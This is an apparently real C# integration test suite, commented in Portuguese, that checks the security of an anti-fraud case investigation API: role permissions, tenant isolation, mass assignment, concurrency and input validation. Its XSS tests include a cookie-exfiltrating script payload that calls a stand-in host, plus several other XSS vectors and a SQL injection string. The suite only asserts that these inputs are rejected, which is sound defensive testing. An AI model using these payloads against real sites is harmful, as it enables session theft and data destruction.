using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using CentralAntifraude.Domain.Alertas;
using CentralAntifraude.Domain.Identidade;
using CentralAntifraude.Domain.Investigacao;
using CentralAntifraude.IntegrationTests.Infra;
using Microsoft.EntityFrameworkCore;

namespace CentralAntifraude.IntegrationTests;

/// <summary>
/// Security Gate 7 — a investigacao humana.
///
/// Esta e a primeira fase em que **pessoas escrevem no sistema**: titulo, nota,
/// atribuicao, veredito. Isso muda o que precisa ser provado. Ate aqui os gates
/// cuidavam sobretudo de leitura e de ausencia de escrita; agora ha escrita de
/// verdade, e com ela tres riscos novos:
///
/// 1. **texto de gente** — que e por onde XSS entra;
/// 2. **duas pessoas ao mesmo tempo** — que e por onde o lost update entra;
/// 3. **estado que nao pode voltar atras** — um veredito que muda depois faria
///    backtests antigos passarem a mentir.
/// </summary>
[Collection(ColecaoDoBanco.Nome)]
public sealed class SecurityGate7Tests : IAsyncLifetime
{
    private const string Caminho = "/api/casos";

    private readonly FixtureDoBanco _banco;
    private FabricaDaApi _fabrica = null!;
    private HttpClient _cliente = null!;
    private TenantDeTeste _tenantA = null!;
    private TenantDeTeste _tenantB = null!;
    private IntegracaoDeTeste _integracaoA = null!;
    private IntegracaoDeTeste _integracaoB = null!;
    private CenarioDeMensageria _mensageria = null!;

    /// <summary>
    /// Um login por (tenant, perfil). O login tem limite por IP desde a Fase 1,
    /// e um teste que faz muitas acoes bateria nele por um motivo que nada tem
    /// a ver com o que ele afirma.
    /// </summary>
    private readonly Dictionary<(Guid Tenant, PerfilDeUsuario Perfil), string> _tokens = [];

    public SecurityGate7Tests(FixtureDoBanco banco) => _banco = banco;

    private static CancellationToken Cancelamento => TestContext.Current.CancellationToken;

    public async ValueTask InitializeAsync()
    {
        await using (var contexto = CenarioDeIdentidade.CriarContexto(_banco.StringDeConexao))
        {
            await contexto.Database.MigrateAsync(Cancelamento);
        }

        _tenantA = await CenarioDeIdentidade.CriarTenantAsync(
            _banco.StringDeConexao,
            $"sg7a-{Guid.NewGuid():N}"[..12],
            Cancelamento);

        _tenantB = await CenarioDeIdentidade.CriarTenantAsync(
            _banco.StringDeConexao,
            $"sg7b-{Guid.NewGuid():N}"[..12],
            Cancelamento);

        await CenarioDeMensageria.LimparAsync(_banco.StringDeConexao, Cancelamento);

        _fabrica = new FabricaDaApi(_banco.StringDeConexao);
        _cliente = _fabrica.CriarClienteSemCookieAutomatico();

        _integracaoA = await CenarioDeIngestao.CriarIntegracaoAsync(_cliente, _tenantA, Cancelamento);
        _integracaoB = await CenarioDeIngestao.CriarIntegracaoAsync(_cliente, _tenantB, Cancelamento);
        _mensageria = CenarioDeMensageria.Criar(_banco.StringDeConexao);
    }

    public async ValueTask DisposeAsync()
    {
        _cliente?.Dispose();

        if (_mensageria is not null)
        {
            await _mensageria.DisposeAsync();
        }

        if (_fabrica is not null)
        {
            await _fabrica.DisposeAsync();
        }
    }

    // -----------------------------------------------------------------------
    // 1 e 9. Perfis: o Auditor le tudo e nao escreve nada
    // -----------------------------------------------------------------------

    [Fact]
    public async Task Auditor_le_o_caso_inteiro()
    {
        // Consultar decisoes, historico e trilha e exatamente o trabalho do
        // Auditor (CLAUDE.md secao 8.3). Ele precisa ver a investigacao.
        var caso = await CasoAbertoAsync("auditor-le");

        using var resposta = await ObterAsync(
            _tenantA,
            PerfilDeUsuario.Auditor,
            caso.GetProperty("id").GetGuid());

        resposta.EnsureSuccessStatusCode();

        var lido = await LerAsync(resposta);

        Assert.NotEmpty(lido.GetProperty("timeline").EnumerateArray());

        // E nao ve nenhuma acao oferecida: a lista vem do servidor, e para ele
        // ela e vazia.
        Assert.Empty(lido.GetProperty("acoesPermitidas").EnumerateArray());
    }

    [Fact]
    public async Task Auditor_nao_alcanca_nenhuma_rota_de_escrita()
    {
        var caso = await CasoAbertoAsync("auditor-escreve");
        var casoId = caso.GetProperty("id").GetGuid();
        var versao = caso.GetProperty("versao").GetInt32();

        var alerta = await AlertaAsync(_tenantA, _integracaoA, "auditor-alerta");
        var analista = await UsuarioIdAsync(_tenantA, PerfilDeUsuario.AnalistaDeFraude);

        var tentativas = new (string Caminho, object Corpo)[]
        {
            ($"{Caminho}", new { titulo = "Caso do auditor", alertasIds = new[] { alerta.Id } }),
            ($"{Caminho}/{casoId}/assumir", new { versao }),
            ($"{Caminho}/{casoId}/transferir", new { paraUsuarioId = analista, versao }),
            ($"{Caminho}/{casoId}/notas", new { conteudo = "nota do auditor", versao }),
            ($"{Caminho}/{casoId}/alertas", new { alertaId = alerta.Id, versao }),
            ($"{Caminho}/{casoId}/resolucao", new { resultado = "Legitima", versao }),
        };

        foreach (var (caminho, corpo) in tentativas)
        {
            using var resposta = await EnviarAsync(
                _tenantA,
                PerfilDeUsuario.Auditor,
                HttpMethod.Post,
                caminho,
                corpo);

            Assert.Equal(HttpStatusCode.Forbidden, resposta.StatusCode);
        }

        // E o caso continua exatamente como estava.
        Assert.Equal(versao, (await CasoNoBancoAsync(casoId)).Versao);
    }

    [Fact]
    public async Task Analista_nao_transfere_caso()
    {
        // Assumir e pegar um caso livre para si; transferir e tirar o caso de
        // alguem, e isso e ato de supervisao. Sem a separacao, um analista
        // poderia esvaziar a fila de outro.
        var caso = await CasoAbertoAsync("analista-transfere");
        var outro = await UsuarioIdAsync(_tenantA, PerfilDeUsuario.SupervisorDeFraude);

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{caso.GetProperty("id").GetGuid()}/transferir",
            new { paraUsuarioId = outro, versao = caso.GetProperty("versao").GetInt32() });

        Assert.Equal(HttpStatusCode.Forbidden, resposta.StatusCode);
    }

    [Fact]
    public async Task Sem_autenticacao_nada_responde()
    {
        using var lista = await _cliente.GetAsync(new Uri(Caminho, UriKind.Relative), Cancelamento);

        Assert.Equal(HttpStatusCode.Unauthorized, lista.StatusCode);

        using var requisicao = new HttpRequestMessage(HttpMethod.Post, new Uri(Caminho, UriKind.Relative))
        {
            Content = JsonContent.Create(new { titulo = "Sem sessao", alertasIds = new[] { Guid.NewGuid() } }),
        };

        // Credencial de maquina tambem nao: integracao ingere, e nao investiga.
        requisicao.Headers.TryAddWithoutValidation(
            "Authorization",
            $"{CenarioDeIngestao.EsquemaDaChave} {_integracaoA.Chave}");

        using var criacao = await _cliente.SendAsync(requisicao, Cancelamento);

        Assert.Equal(HttpStatusCode.Unauthorized, criacao.StatusCode);
    }

    // -----------------------------------------------------------------------
    // 2, 3 e 5. Isolamento de tenant
    // -----------------------------------------------------------------------

    [Fact]
    public async Task Caso_de_outro_tenant_nao_existe_daqui()
    {
        var caso = await CasoAbertoAsync("cross-tenant");
        var casoId = caso.GetProperty("id").GetGuid();

        // 404, e nao 403: um 403 ja confirmaria que aquele identificador
        // existe em algum lugar (CLAUDE.md secao 52).
        using var leitura = await ObterAsync(_tenantB, PerfilDeUsuario.AnalistaDeFraude, casoId);

        Assert.Equal(HttpStatusCode.NotFound, leitura.StatusCode);

        using var acao = await EnviarAsync(
            _tenantB,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{casoId}/assumir",
            new { versao = caso.GetProperty("versao").GetInt32() });

        Assert.Equal(HttpStatusCode.NotFound, acao.StatusCode);

        // E a lista do outro tenant nao o inclui.
        using var lista = await EnviarAsync(_tenantB, PerfilDeUsuario.AnalistaDeFraude, HttpMethod.Get, Caminho, null);

        lista.EnsureSuccessStatusCode();

        var json = await LerAsync(lista);

        Assert.Equal(0, json.GetProperty("total").GetInt64());
    }

    [Fact]
    public async Task Alerta_de_outro_tenant_nao_entra_em_um_caso()
    {
        // Este e o vazamento mais silencioso da fase: o dado de um cliente
        // entrando na investigacao de outro, sem erro no caminho.
        var alertaDeB = await AlertaAsync(_tenantB, _integracaoB, "alerta-de-b");

        using var abertura = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            Caminho,
            new { titulo = "Tentando roubar alerta", alertasIds = new[] { alertaDeB.Id } });

        Assert.Equal(HttpStatusCode.NotFound, abertura.StatusCode);

        // E associando a um caso ja aberto, tambem nao.
        var caso = await CasoAbertoAsync("assoc-cross");

        using var associacao = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{caso.GetProperty("id").GetGuid()}/alertas",
            new { alertaId = alertaDeB.Id, versao = caso.GetProperty("versao").GetInt32() });

        Assert.Equal(HttpStatusCode.NotFound, associacao.StatusCode);

        // O alerta de B continua aberto na fila dele.
        await using var contexto = CenarioDeIdentidade.CriarContextoComoTenant(
            _banco.StringDeConexao,
            _tenantB.OrganizacaoId);

        var intacto = await contexto.Alertas.SingleAsync(a => a.Id == alertaDeB.Id, Cancelamento);

        Assert.Equal(StatusDoAlerta.Aberto, intacto.Status);
        Assert.Null(intacto.CasoId);
    }

    [Fact]
    public async Task Nao_da_para_atribuir_um_caso_a_usuario_de_outro_tenant()
    {
        var caso = await CasoAbertoAsync("transf-cross");
        var deOutroTenant = await UsuarioIdAsync(_tenantB, PerfilDeUsuario.AnalistaDeFraude);

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.SupervisorDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{caso.GetProperty("id").GetGuid()}/transferir",
            new { paraUsuarioId = deOutroTenant, versao = caso.GetProperty("versao").GetInt32() });

        Assert.Equal(HttpStatusCode.NotFound, resposta.StatusCode);
    }

    [Fact]
    public async Task Nao_da_para_atribuir_um_caso_a_um_auditor()
    {
        // O Auditor nao age sobre casos. Torna-lo responsavel criaria um caso
        // que ninguem pode resolver.
        var caso = await CasoAbertoAsync("transf-auditor");
        var auditor = await UsuarioIdAsync(_tenantA, PerfilDeUsuario.Auditor);

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.SupervisorDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{caso.GetProperty("id").GetGuid()}/transferir",
            new { paraUsuarioId = auditor, versao = caso.GetProperty("versao").GetInt32() });

        Assert.Equal(HttpStatusCode.Conflict, resposta.StatusCode);
    }

    // -----------------------------------------------------------------------
    // 4. Mass assignment
    // -----------------------------------------------------------------------

    [Theory]
    [InlineData("status")]
    [InlineData("resultado")]
    [InlineData("responsavelId")]
    [InlineData("organizacaoId")]
    [InlineData("versao")]
    [InlineData("abertoPorId")]
    public async Task Campo_interno_no_corpo_da_abertura_e_recusado(string campo)
    {
        // JSON estrito: campo desconhecido nao e ignorado em silencio, e
        // recusado (CLAUDE.md secoes 53 e 54). Ignorar faria quem mandou
        // acreditar que o campo foi aceito.
        var alerta = await AlertaAsync(_tenantA, _integracaoA, $"mass-{campo}");

        var corpo = new Dictionary<string, object?>(StringComparer.Ordinal)
        {
            ["titulo"] = "Caso com campo a mais",
            ["alertasIds"] = new[] { alerta.Id },
            [campo] = campo == "status" ? "Resolvido" : Guid.NewGuid().ToString(),
        };

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            Caminho,
            corpo);

        Assert.Equal(HttpStatusCode.BadRequest, resposta.StatusCode);
    }

    [Fact]
    public async Task Nao_existe_rota_que_grave_o_caso_inteiro()
    {
        // Um `PUT /casos/{id}` aceitando o objeto todo convidaria justamente ao
        // mass assignment: bastaria mandar `status` e `resultado` no corpo. As
        // transicoes sao rotas de acao, cada uma com sua regra.
        var caso = await CasoAbertoAsync("sem-put");
        var casoId = caso.GetProperty("id").GetGuid();

        foreach (var metodo in new[] { HttpMethod.Put, HttpMethod.Patch, HttpMethod.Delete })
        {
            using var resposta = await EnviarAsync(
                _tenantA,
                PerfilDeUsuario.AnalistaDeFraude,
                metodo,
                $"{Caminho}/{casoId}",
                new { status = "Resolvido", resultado = "Legitima" });

            Assert.True(
                resposta.StatusCode is HttpStatusCode.NotFound or HttpStatusCode.MethodNotAllowed,
                $"{metodo} devolveu {(int)resposta.StatusCode}.");
        }
    }

    // -----------------------------------------------------------------------
    // 6. Texto de gente
    // -----------------------------------------------------------------------

    [Theory]
    [InlineData("<script>fetch('http://mal.example/'+document.cookie)</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("<iframe src=javascript:alert(1)>")]
    [InlineData("</textarea><svg onload=alert(1)>")]
    public async Task Nota_com_marcacao_e_recusada_e_nada_e_gravado(string conteudo)
    {
        var caso = await CasoAbertoAsync($"xss-{Guid.NewGuid():N}"[..12]);
        var casoId = caso.GetProperty("id").GetGuid();

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{casoId}/notas",
            new { conteudo, versao = caso.GetProperty("versao").GetInt32() });

        Assert.Equal(HttpStatusCode.BadRequest, resposta.StatusCode);

        await using var contexto = CenarioDeIdentidade.CriarContextoComoTenant(
            _banco.StringDeConexao,
            _tenantA.OrganizacaoId);

        Assert.Equal(0, await contexto.NotasDoCaso.CountAsync(n => n.CasoId == casoId, Cancelamento));
    }

    [Fact]
    public async Task Nota_valida_volta_exatamente_como_foi_escrita()
    {
        // **Recusar, nunca limpar.** Uma nota que o sistema altera sozinho
        // deixa de ser o que o analista escreveu — e numa investigacao isso e
        // pior do que uma recusa com explicacao. O teste prova que nada e
        // escapado nem cortado no caminho.
        const string texto = "Cliente alegou compra com valor < 100 & confirmou por telefone. Custo 5 > 3.";

        var caso = await CasoAbertoAsync("nota-intacta");
        var casoId = caso.GetProperty("id").GetGuid();

        using var criacao = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{casoId}/notas",
            new { conteudo = texto, versao = caso.GetProperty("versao").GetInt32() });

        criacao.EnsureSuccessStatusCode();

        using var leitura = await ObterAsync(_tenantA, PerfilDeUsuario.AnalistaDeFraude, casoId);
        var lido = await LerAsync(leitura);

        var nota = Assert.Single(lido.GetProperty("notas").EnumerateArray());

        Assert.Equal(texto, nota.GetProperty("conteudo").GetString());
    }

    [Fact]
    public async Task Titulo_com_marcacao_e_recusado()
    {
        var alerta = await AlertaAsync(_tenantA, _integracaoA, "titulo-xss");

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            Caminho,
            new { titulo = "<script>alert(1)</script>", alertasIds = new[] { alerta.Id } });

        Assert.Equal(HttpStatusCode.BadRequest, resposta.StatusCode);
    }

    // -----------------------------------------------------------------------
    // 7. Lost update
    // -----------------------------------------------------------------------

    [Fact]
    public async Task Agir_com_uma_versao_velha_e_recusado()
    {
        var caso = await CasoAbertoAsync("versao-velha");
        var casoId = caso.GetProperty("id").GetGuid();
        var versaoInicial = caso.GetProperty("versao").GetInt32();

        using var primeira = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{casoId}/notas",
            new { conteudo = "Primeira anotacao.", versao = versaoInicial });

        await GarantirSucessoAsync(primeira);

        // A segunda pessoa ainda estava vendo o estado anterior.
        using var segunda = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{casoId}/notas",
            new { conteudo = "Escrevendo por cima sem saber.", versao = versaoInicial });

        Assert.Equal(HttpStatusCode.Conflict, segunda.StatusCode);

        var corpo = await segunda.Content.ReadAsStringAsync(Cancelamento);

        Assert.Contains("versao_desatualizada", corpo, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Duas_resolucoes_simultaneas_produzem_um_resultado_so()
    {
        // **A prova de verdade.** As duas requisicoes leem a mesma versao e
        // passam juntas pela checagem da aplicacao; quem arbitra e o token de
        // concorrencia no banco. Sem ele, os dois `UPDATE` passariam e o
        // ultimo venceria em silencio — dois vereditos diferentes sobre a
        // mesma investigacao.
        var caso = await CasoAbertoAsync("corrida");
        var casoId = caso.GetProperty("id").GetGuid();

        var assumido = await AcaoAsync(
            casoId,
            "assumir",
            new { versao = caso.GetProperty("versao").GetInt32() });

        var versao = assumido.GetProperty("versao").GetInt32();

        var token = await TokenAsync(_tenantA, PerfilDeUsuario.AnalistaDeFraude);

        var corpos = new object[]
        {
            new { resultado = nameof(ResultadoDaInvestigacao.FraudeConfirmada), versao },
            new { resultado = nameof(ResultadoDaInvestigacao.Legitima), versao },
        };

        var respostas = await Task.WhenAll(corpos.Select(async corpo =>
        {
            using var requisicao = CenarioDeIdentidade.Autenticada(
                HttpMethod.Post,
                $"{Caminho}/{casoId}/resolucao",
                token);

            requisicao.Content = JsonContent.Create(corpo);

            using var resposta = await _cliente.SendAsync(requisicao, Cancelamento);

            return resposta.StatusCode;
        }));

        Assert.Equal(1, respostas.Count(s => s == HttpStatusCode.OK));
        Assert.Equal(1, respostas.Count(s => s == HttpStatusCode.Conflict));

        // E o caso tem um resultado so.
        var final = await CasoNoBancoAsync(casoId);

        Assert.Equal(StatusDoCaso.Resolvido, final.Status);
        Assert.NotNull(final.Resultado);

        await using var contexto = CenarioDeIdentidade.CriarContextoComoTenant(
            _banco.StringDeConexao,
            _tenantA.OrganizacaoId);

        // Um veredito por transacao, e nao dois.
        Assert.Equal(1, await contexto.ResultadosDeInvestigacao.CountAsync(
            r => r.CasoId == casoId,
            Cancelamento));
    }

    // -----------------------------------------------------------------------
    // 8. Caso resolvido nao muda
    // -----------------------------------------------------------------------

    [Fact]
    public async Task Caso_resolvido_recusa_toda_alteracao()
    {
        // A Fase 9 vai usar o resultado humano como verdade. Um veredito que
        // muda depois faria backtests antigos passarem a mentir sem que
        // ninguem percebesse.
        var caso = await CasoAbertoAsync("congelado");
        var casoId = caso.GetProperty("id").GetGuid();

        var assumido = await AcaoAsync(
            casoId,
            "assumir",
            new { versao = caso.GetProperty("versao").GetInt32() });

        var resolvido = await AcaoAsync(
            casoId,
            "resolucao",
            new
            {
                resultado = nameof(ResultadoDaInvestigacao.FraudeConfirmada),
                versao = assumido.GetProperty("versao").GetInt32(),
            });

        var versao = resolvido.GetProperty("versao").GetInt32();
        var alerta = await AlertaAsync(_tenantA, _integracaoA, "congelado-extra");
        var supervisor = await UsuarioIdAsync(_tenantA, PerfilDeUsuario.SupervisorDeFraude);

        var tentativas = new (string Acao, object Corpo, PerfilDeUsuario Perfil)[]
        {
            ("notas", new { conteudo = "mais uma coisa", versao }, PerfilDeUsuario.AnalistaDeFraude),
            ("alertas", new { alertaId = alerta.Id, versao }, PerfilDeUsuario.AnalistaDeFraude),
            ("assumir", new { versao }, PerfilDeUsuario.SupervisorDeFraude),
            ("transferir", new { paraUsuarioId = supervisor, versao }, PerfilDeUsuario.SupervisorDeFraude),
            ("resolucao", new { resultado = "Legitima", versao }, PerfilDeUsuario.SupervisorDeFraude),
        };

        foreach (var (acao, corpo, perfil) in tentativas)
        {
            using var resposta = await EnviarAsync(
                _tenantA,
                perfil,
                HttpMethod.Post,
                $"{Caminho}/{casoId}/{acao}",
                corpo);

            Assert.Equal(HttpStatusCode.Conflict, resposta.StatusCode);
        }

        var final = await CasoNoBancoAsync(casoId);

        Assert.Equal(ResultadoDaInvestigacao.FraudeConfirmada, final.Resultado);
        Assert.Equal(versao, final.Versao);
    }

    [Fact]
    public async Task Resultado_fora_do_vocabulario_e_recusado()
    {
        // Nao existe "resultado padrao de investigacao": alguem precisa
        // decidir. Um valor desconhecido nunca cai num default.
        var caso = await CasoAbertoAsync("resultado-invalido");
        var casoId = caso.GetProperty("id").GetGuid();

        var assumido = await AcaoAsync(
            casoId,
            "assumir",
            new { versao = caso.GetProperty("versao").GetInt32() });

        var versao = assumido.GetProperty("versao").GetInt32();

        foreach (var valor in new[] { "Inventado", "1", "99", string.Empty, "'; DROP TABLE casos; --" })
        {
            using var resposta = await EnviarAsync(
                _tenantA,
                PerfilDeUsuario.AnalistaDeFraude,
                HttpMethod.Post,
                $"{Caminho}/{casoId}/resolucao",
                new { resultado = valor, versao });

            Assert.Equal(HttpStatusCode.BadRequest, resposta.StatusCode);
        }

        Assert.Equal(StatusDoCaso.EmAnalise, (await CasoNoBancoAsync(casoId)).Status);
    }

    [Fact]
    public async Task Filtro_forjado_na_lista_e_recusado()
    {
        foreach (var consulta in new[]
        {
            "status=Inventado",
            "status=2",
            "resultado=Culpado",
            "ordenarPor=organizacao_id",
            "tamanho=5000",
        })
        {
            using var resposta = await EnviarAsync(
                _tenantA,
                PerfilDeUsuario.AnalistaDeFraude,
                HttpMethod.Get,
                $"{Caminho}?{consulta}",
                null);

            Assert.Equal(HttpStatusCode.BadRequest, resposta.StatusCode);
        }
    }

    // -----------------------------------------------------------------------
    // Apoio
    // -----------------------------------------------------------------------

    private Task<Alerta> AlertaAsync(TenantDeTeste tenant, IntegracaoDeTeste integracao, string prefixo) =>
        CenarioDeInvestigacao.GerarAlertaAsync(
            _cliente,
            _banco.StringDeConexao,
            tenant,
            integracao,
            _mensageria,
            prefixo,
            Cancelamento);

    private async Task<JsonElement> CasoAbertoAsync(string prefixo)
    {
        var alerta = await AlertaAsync(_tenantA, _integracaoA, prefixo);

        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            Caminho,
            new { titulo = $"Caso {prefixo}", alertasIds = new[] { alerta.Id } });

        resposta.EnsureSuccessStatusCode();

        return await LerAsync(resposta);
    }

    private async Task<JsonElement> AcaoAsync(Guid casoId, string acao, object corpo)
    {
        using var resposta = await EnviarAsync(
            _tenantA,
            PerfilDeUsuario.AnalistaDeFraude,
            HttpMethod.Post,
            $"{Caminho}/{casoId}/{acao}",
            corpo);

        resposta.EnsureSuccessStatusCode();

        return await LerAsync(resposta);
    }

    private async Task<HttpResponseMessage> EnviarAsync(
        TenantDeTeste tenant,
        PerfilDeUsuario perfil,
        HttpMethod metodo,
        string caminho,
        object? corpo)
    {
        var token = await TokenAsync(tenant, perfil);

        using var requisicao = CenarioDeIdentidade.Autenticada(metodo, caminho, token);

        if (corpo is not null)
        {
            requisicao.Content = JsonContent.Create(corpo);
        }

        return await _cliente.SendAsync(requisicao, Cancelamento);
    }

    private Task<HttpResponseMessage> ObterAsync(TenantDeTeste tenant, PerfilDeUsuario perfil, Guid casoId) =>
        EnviarAsync(tenant, perfil, HttpMethod.Get, $"{Caminho}/{casoId}", null);

    private async Task<string> TokenAsync(TenantDeTeste tenant, PerfilDeUsuario perfil)
    {
        var chave = (tenant.OrganizacaoId, perfil);

        if (_tokens.TryGetValue(chave, out var guardado))
        {
            return guardado;
        }

        var token = await CenarioDeIngestao.TokenDeAsync(_cliente, tenant, perfil, Cancelamento);

        _tokens[chave] = token;

        return token;
    }

    private async Task<Guid> UsuarioIdAsync(TenantDeTeste tenant, PerfilDeUsuario perfil)
    {
        await using var contexto = CenarioDeIdentidade.CriarContextoComoTenant(
            _banco.StringDeConexao,
            tenant.OrganizacaoId);

        // Por PERFIL, e nao por e-mail: `Email` e um value object convertido
        // para coluna, e comparar a propriedade interna nao e traduzivel para
        // SQL. Cada tenant de teste tem um usuario de cada perfil.
        return await contexto.Usuarios
            .Where(u => u.Perfil == perfil)
            .Select(u => u.Id)
            .SingleAsync(Cancelamento);
    }

    private async Task<Caso> CasoNoBancoAsync(Guid casoId)
    {
        await using var contexto = CenarioDeIdentidade.CriarContextoComoTenant(
            _banco.StringDeConexao,
            _tenantA.OrganizacaoId);

        return await contexto.Casos.SingleAsync(c => c.Id == casoId, Cancelamento);
    }

    /// <summary>
    /// Falha dizendo O QUE o servidor respondeu.
    ///
    /// `EnsureSuccessStatusCode` sozinho diz so o codigo, e um 409 sem o corpo
    /// nao distingue "versao velha" de "estado do caso" — que sao problemas
    /// diferentes.
    /// </summary>
    private static async Task GarantirSucessoAsync(HttpResponseMessage resposta)
    {
        if (resposta.IsSuccessStatusCode)
        {
            return;
        }

        var corpo = await resposta.Content.ReadAsStringAsync(TestContext.Current.CancellationToken);

        Assert.Fail($"{(int)resposta.StatusCode} em {resposta.RequestMessage?.RequestUri}: {corpo}");
    }

    private static async Task<JsonElement> LerAsync(HttpResponseMessage resposta)
    {
        var texto = await resposta.Content.ReadAsStringAsync(TestContext.Current.CancellationToken);

        return JsonDocument.Parse(texto).RootElement.Clone();
    }
}
